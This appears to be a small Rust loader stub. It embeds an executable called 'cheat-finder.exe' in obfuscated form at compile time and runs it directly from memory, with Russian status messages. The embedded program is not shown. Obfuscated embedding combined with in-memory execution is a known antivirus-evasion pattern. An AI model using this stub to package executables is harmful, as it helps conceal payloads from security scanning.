use std::{thread, time::Duration};

use include_crypt_bytes::include_bytes_obfuscate;

fn main() {
    let bytes = include_bytes_obfuscate!("src/cheat-finder.exe");

    match bytes {
        Ok(buf) => {
            println!("Инициализация...");
            unsafe { memexec::memexec_exe(&buf).unwrap(); }
        },
        Err(err) => {
            println!("Произошла ошибка при инициализации: {:?}", err);
            thread::sleep(Duration::new(10, 0));
        }
    }
}
